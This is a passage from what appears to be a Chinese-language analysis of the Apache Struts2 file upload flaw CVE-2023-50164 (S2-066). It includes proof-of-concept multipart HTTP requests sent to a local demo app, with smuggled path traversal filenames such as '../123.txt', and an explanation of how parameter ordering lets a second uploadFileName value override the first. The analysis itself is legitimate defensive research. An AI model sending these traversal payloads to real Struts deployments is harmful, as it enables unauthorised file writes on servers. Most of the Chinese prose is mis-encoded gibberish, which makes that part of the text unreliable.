--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--
Content-Disposition: form-data; name="uploadFileName"

../123.txt
--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--
```

```
POST /apachestrutsdemo_war_exploded/upload.action?uploadFileName=../123.txt HTTP/1.1
Host: 127.0.0.1:8082
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 188
Content-Type: multipart/form-data; boundary=------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN
Content-Disposition: form-data; name="Upload"; filename="../1.txt"
Content-Type: text/plain

1aaa
--------------------------xmQEXKePZSVwNZmNjGHSafZOcxAMpAjXtGWfDZWN--
```

**æ€»ç»“**

é€ æˆå˜é‡è¦†ç›–çš„æ ¹æœ¬åŸå› å°±æ˜¯ `acceptableParameters` ä¸º `TreeMap`,  Ascii ç å¤§çš„å€¼é å‰æ’

æ ¹æ® POC, åœ¨ `ParametersInterceptor#setParameters` ä¸­å¾ªç¯è°ƒç”¨ `setter` èµ‹å€¼çš„é¡ºåºä¸º

1. `Upload`
2. `UploadContentType`
3. `UploadFileName`
4. `uploadFileName`

è™½ç„¶ `uploadFileName` å¹¶ä¸æ˜¯ `UploadAction` çš„å±æ€§, ä½†æ˜¯åˆ«å¿˜äº†åœ¨å¯»æ‰¾ `setter` æ—¶, ç»è¿‡äº† `OgnlRuntime#capitalizeBeanPropertyName`, è¢«å¤„ç†åæˆäº† `UploadFileName`, æ‰€ä»¥å°±èƒ½æ‰¾åˆ°å¯¹åº”çš„ `setUploadFileName` æ–¹æ³•

**æœ€åå°±æ˜¯è¯´æ‰§è¡Œäº†ä¸¤æ¬¡ `setUploadFileName`, ç¬¬ä¸€æ¬¡èµ‹å€¼ä¸ºæ­£å¸¸çš„ 1.txt, ç¬¬äºŒæ¬¡åˆ™æˆäº† ../123.txt**

æ¥åšç»„æµ‹è¯•

é€šè¿‡åˆ©ç”¨ upload å’Œ uploadFileName ä¸¤ä¸ªå‚æ•°è¿›è¡Œä¸Šä¼ 

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2067.png)

èƒ½å¤Ÿä¸Šä¼ æ–‡ä»¶, ä½†æ— æ³•ç›®å½•ç©¿è¶Š, è°ƒè¯•ä¸€ä¸‹åœ¨ `ParametersInterceptor#setParameters` å¤„ä¹Ÿå¯ä»¥çœ‹åˆ° ../123.txt æ²¡æœ‰è¢«è§£æåˆ°å…¶ä¸­

![Untitled](Apache%20Struts2%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90(CVE-2023-50164%20S2-066)%20545486c2c0f74ea786f6c05eb42f7267/Untitled%2068.png)

åˆ©ç”¨å±€é™

<aside>
ğŸ’¡ **ç›®å½•ç©¿è¶Šæ— æ³•å‘ç”Ÿåœ¨ Struts æ¡†æ¶ä¸­ï¼Œæ ¹æ® S2 å†å²æ¼æ´çš„ç‰¹ç‚¹ï¼Œåªèƒ½æ˜¯åœ¨äºŒæ¬¡å¼€å‘çš„ä¸šåŠ¡ä»£ç ä¸­ã€‚**

</aside>

åªèƒ½æ˜¯åœ¨å¼€å‘äººå‘˜å¯¹uploadå¤„ç†ä¸ä¸¥æ ¼æ—¶,å¯èƒ½ä¼šé€ æˆæ¼æ´

è€Œä¸”å¾ˆæ˜¾ç„¶çš„æ˜¯æˆ‘ä»¬æ„é€ çš„æ•°æ®åŒ…ä¸­, `name="Upload";`, è¦ä¸å¤„ç† `UploadAction` ç±»ä¸­çš„å±æ€§ä¸€è‡´

ä¸ç„¶ `inputname` ä¸ `ContentType` æ‹¼æ¥å¾—åˆ°çš„ `inputnameContentType`, ä¸ `FileName` æ‹¼æ¥å¾—åˆ°çš„`inputnameFileName`, åœ¨`UploadAction` ç±»ä¹Ÿæ‰¾ä¸åˆ°å¯¹åº”çš„ `setter`

å‚è€ƒæ–‡ç« 

**[Apache Struts2 æ–‡ä»¶ä¸Šä¼ åˆ†æ(S2-066)](https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/)**

**[ã€æ¼æ´åˆ†æã€‘Apache Struts2 æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼ˆCVE-2023-50164/S2-066ï¼‰-ä¿å§†ç‰ˆ](https://mp.weixin.qq.com/s?__biz=MzkxMTUyMjUxMw==&mid=2247517512&idx=1&sn=abef185d1d5de9f669fc7c1b5aa901e0&chksm=c1182af6f66fa3e0fc0eaae7b17df72fb204e51adca024b35ad61a7a926c0568c950239f43ea&mpshare=1&scene=1&srcid=1213VtnAcpHuYT3Np1xEk1Q0&sharer_shareinfo=a7da8a7a5e78b35f2a1f37ebff58a729&sharer_shareinfo_first=a7da8a7a5e78b35f2a1f37ebff58a729#rd)**